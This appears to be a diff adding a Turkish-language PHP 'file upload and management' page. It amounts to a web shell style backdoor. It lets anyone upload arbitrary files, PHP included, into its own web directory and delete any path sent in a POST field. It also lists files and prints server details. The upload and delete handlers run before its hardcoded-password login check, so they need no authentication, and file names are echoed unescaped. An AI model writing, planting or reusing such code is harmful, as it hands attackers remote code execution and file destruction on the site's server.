@@ -1,0 +1,213 @@
+<?php
+session_start();
+
+// Şifre kontrolü
+$correct_password = "yunusemre";  // Burada şifrenizi belirleyin
+
+// Giriş işlemi
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+    if (isset($_POST['password'])) {
+        $entered_password = $_POST['password'];
+
+        if ($entered_password == $correct_password) {
+            $_SESSION['logged_in'] = true;
+        } else {
+            $error_message = "Yanlış şifre!";
+        }
+    } elseif (isset($_FILES['file'])) {
+        // Dosya yükleme işlemi
+        $file_name = $_FILES['file']['name'];
+        $file_tmp = $_FILES['file']['tmp_name'];
+
+        // PHP dosyasının bulunduğu dizine yükleme
+        $upload_path = __DIR__ . '/' . basename($file_name); // Dosya, PHP'nin bulunduğu dizine yüklenecek
+
+        if (move_uploaded_file($file_tmp, $upload_path)) {
+            $message = "Dosya başarıyla yüklendi.";
+        } else {
+            $message = "Dosya yüklenirken bir hata oluştu.";
+        }
+    } elseif (isset($_POST['delete_file'])) {
+        // Dosya silme işlemi
+        $file_to_delete = $_POST['delete_file'];
+        if (unlink($file_to_delete)) {
+            $message = "Dosya başarıyla silindi.";
+        } else {
+            $message = "Dosya silinirken bir hata oluştu.";
+        }
+    }
+}
+
+// Kullanıcı giriş yapmamışsa, giriş formu göster
+if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
+?>
+    <!DOCTYPE html>
+    <html lang="tr">
+    <head>
+        <meta charset="UTF-8">
+        <title>Giriş Yap</title>
+        <link rel="icon" href="https://i.hizliresim.com/8dcclfe.jfif" type="image/jfif"> <!-- Favicon Ekleme -->
+        <style>
+            body {
+                background-image: url('https://i.hizliresim.com/bfddimd.jpg'); /* Arka plan resmi */
+                background-size: cover; /* Arka planın tüm ekranı kaplaması için */
+                color: white; /* Yazı rengini beyaz yapalım */
+                font-family: Arial, sans-serif; /* Font stili */
+                text-align: center; /* Yazı hizalaması */
+            }
+            form {
+                background-color: rgba(0, 0, 0, 0.6); /* Şeffaf siyah arka plan */
+                padding: 20px;
+                border-radius: 10px;
+                display: inline-block;
+                margin-top: 100px;
+            }
+            input[type="password"], input[type="submit"] {
+                padding: 10px;
+                margin: 10px;
+                font-size: 16px;
+                border-radius: 5px;
+            }
+        </style>
+    </head>
+    <body>
+        <h2>Şifre ile Giriş Yap</h2>
+        <?php if (isset($error_message)) { echo "<p style='color:red;'>$error_message</p>"; } ?>
+        <form method="post" action="">
+            <label for="password">Şifre:</label>
+            <input type="password" id="password" name="password" required>
+            <input type="submit" value="Giriş Yap">
+        </form>
+    </body>
+    </html>
+<?php
+    exit();
+}
+
+// Giriş yapılmışsa, dosya yükleme formunu ve dosyaları listelemeyi göster
+?>
+
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <title>Dosya Yükle</title>
+    <link rel="icon" href="https://i.hizliresim.com/8dcclfe.jfif" type="image/jfif"> <!-- Favicon Ekleme -->
+    <style>
+        body {
+            background-image: url('https://i.hizliresim.com/bfddimd.jpg'); /* Arka plan resmi */
+            background-size: cover; /* Arka planın tüm ekranı kaplaması için */
+            color: white; /* Yazı rengini beyaz yapalım */
+            font-family: Arial, sans-serif; /* Font stili */
+            text-align: center; /* Yazı hizalaması */
+        }
+        .menu {
+            margin-top: 20px;
+            background-color: rgba(0, 0, 0, 0.6); /* Şeffaf siyah arka plan */
+            padding: 10px;
+            display: inline-block;
+        }
+        .menu a {
+            color: white;
+            text-decoration: none;
+            padding: 10px;
+            margin: 5px;
+            font-size: 16px;
+        }
+        .menu a:hover {
+            background-color: rgba(0, 0, 0, 0.8);
+            border-radius: 5px;
+        }
+        form {
+            background-color: rgba(0, 0, 0, 0.6); /* Şeffaf siyah arka plan */
+            padding: 20px;
+            border-radius: 10px;
+            display: inline-block;
+            margin-top: 50px;
+        }
+        input[type="file"], input[type="submit"], input[type="text"] {
+            padding: 10px;
+            margin: 10px;
+            font-size: 16px;
+            border-radius: 5px;
+        }
+        .info-container {
+            background-color: rgba(0, 0, 0, 0.6); 
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 50px;
+            max-width: 800px;
+            display: inline-block;
+            text-align: left;
+        }
+    </style>
+</head>
+<body>
+    <h2>Dosya Yükleme ve Yönetim</h2>
+
+    <!-- Menü -->
+    <div class="menu">
+        <a href="?page=upload">Dosya Yükle</a>
+        <a href="?page=list">Dosyaları Listele</a>
+        <a href="?page=server_info">Sunucu Bilgileri</a>
+        <a href="?logout=true">Çıkış Yap</a>
+    </div>
+
+    <?php
+    // Çıkış işlemi
+    if (isset($_GET['logout'])) {
+        session_unset();
+        session_destroy();
+        header('Location: ' . $_SERVER['PHP_SELF']);
+        exit();
+    }
+
+    // Sayfa yönlendirmeleri
+    if (isset($_GET['page'])) {
+        switch ($_GET['page']) {
+            case 'upload':
+                // Dosya Yükleme
+                echo '<h3>Dosya Yükle</h3>';
+                echo isset($message) ? "<p>$message</p>" : '';
+                echo '<form method="post" enctype="multipart/form-data">
+                        <label for="file">Dosya Seçin:</label>
+                        <input type="file" name="file" id="file" required>
+                        <input type="submit" value="Dosya Yükle">
+                      </form>';
+                break;
+            
+            case 'list':
+                // Yüklenen dosyaları listele
+                echo '<h3>Yüklenen Dosyalar</h3>';
+                $files = scandir(__DIR__);
+                echo "<ul>";
+                foreach ($files as $file) {
+                    if ($file !== '.' && $file !== '..' && !is_dir($file)) {
+                        echo "<li>$file <form method='post' style='display:inline;' onsubmit='return confirm(\"Dosyayı silmek istediğinizden emin misiniz?\");'>
+                                  <input type='hidden' name='delete_file' value='$file'>
+                                  <input type='submit' value='Sil'>
+                                </form></li>";
+                    }
+                }
+                echo "</ul>";
+                break;
+            
+            case 'server_info':
+                // Sunucu Bilgileri
+                echo '<h3>Sunucu Bilgileri</h3>';
+                echo "<p><strong>PHP Sürümü:</strong> " . phpversion() . "</p>";
+                echo "<p><strong>MySQL Sürümü:</strong> " . mysqli_get_client_version() . "</p>";
+                echo "<p><strong>Sunucu Bilgisi:</strong> " . php_uname() . "</p>";
+                break;
+            
+            default:
+                echo '<h3>Sayfa Bulunamadı</h3>';
+                break;
+        }
+    } else {
+        // Varsayılan sayfa (Ana Sayfa)
+        echo '<h3>Hoşgeldiniz! Lütfen bir işlem seçin.</h3>';
+    }
+    ?>
+</body>
+</html>
